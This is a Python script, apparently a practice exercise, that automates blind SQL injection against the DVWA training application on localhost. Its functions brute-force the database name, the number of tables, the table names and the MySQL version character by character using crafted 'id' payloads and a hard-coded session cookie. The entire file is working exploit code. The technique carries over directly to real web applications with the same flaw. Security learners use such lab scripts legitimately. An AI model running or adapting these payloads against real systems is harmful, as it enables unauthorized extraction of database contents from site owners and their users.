import requests
from bs4 import BeautifulSoup
import urllib

LIMIT = 100
PHPSESSID = "vj4j0b0s5vo65mdd54ohullaq4"
SECURITY = "low"

def get_db_len():
    db_name_len = 0
    while True:
        db_name_len += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+length%28database%28%29%29%3D{db_name_len}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return db_name_len
        if db_name_len == LIMIT:
            raise ValueError(f'DB len search out of LIMIT')
     
def get_db_name_by_digit(digit):
    target_ascii = 47
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28database%28%29%2C{digit}%2C1%29%29%3D{target_ascii}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii >= 123:
            raise ValueError(f'char not found on {digit}')
        
def get_db_full_name(length):
    res = ""
    for i in range(1, length+1):
        res += get_db_name_by_digit(i)
    return res

def get_table_len():
    table_len = 0
    while True:
        table_len += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+%28select+count%28table_name%29+from+information_schema.tables+where+table_schema%3D%27dvwa%27%29%3D{table_len}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return table_len
        if table_len >= 100:
            raise ValueError(f'Tried {table_len} time but table len not found')   
         
def get_table_name_len(table_idx):
    table_name_len = 0
    while True:
        table_name_len += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+length%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+{table_idx}%2C1%29%2C1%29%29%3D{table_name_len}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return table_name_len
        if table_name_len >= 100:
            raise ValueError(f'Tried {table_name_len} time but table len not found')   

def get_table_char_ascii(table_index, digit):
    target_ascii = 47
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+{table_index}%2C1%29%2C{digit}%2C1%29%29%3D{target_ascii}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii >= 123:
            raise ValueError(f'char not found on {digit}')

def get_table_name(table_index, name_len):
    table_name = ""
    for idx in range(1, name_len + 1):
        table_name += get_table_char_ascii(table_index, idx)
    return table_name

def get_db_version_len():
    version_len = 0
    while True:
        version_len += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+length%28%40%40VERSION%29%3D{version_len}%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return version_len
        if version_len >= 100:
            raise ValueError(f'Tried {version_len} time but table len not found')   
        
def get_db_ver_char_ascii(digit):
    target_ascii = 0
    while True:
        target_ascii += 1
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1%27+and+ascii%28substr%28%40%40VERSION%2C{digit}%2C1%29%29%3D{target_ascii}+%23&Submit=Submit#"
        cookies = {"PHPSESSID":PHPSESSID, "security":SECURITY}
        response = requests.post(url, cookies=cookies)
        html_doc = response.content.decode()
        soup = BeautifulSoup(html_doc, 'html.parser')
        if soup.pre.text == "User ID exists in the database.":
            return chr(target_ascii)
        if target_ascii > 127:
            raise ValueError(f'char not found on {digit}')

def get_db_ver(name_len):
    table_name = ""
    for idx in range(1, name_len + 1):
        table_name += get_db_ver_char_ascii(idx)
    return table_name

if __name__ == "__main__":
    db_name_len = get_db_len()
    print(f"Length of db name: {db_name_len}")
    
    db_name = get_db_full_name(db_name_len)
    print(db_name)
    
    table_len = get_table_len()
    print(table_len)
    
    idx_zero_table_name_len, idx_one_table_name_len = get_table_name_len(0), get_table_name_len(1)    
    print(f"Table len of Index 0 : {idx_zero_table_name_len} \nTable len of Index 1 : {idx_one_table_name_len}")
        
    res = get_table_name(1,idx_one_table_name_len)
    print(res)
    
    db_version_len = get_db_version_len()
    db_version = get_db_ver(db_version_len)
    print(db_version)
    
    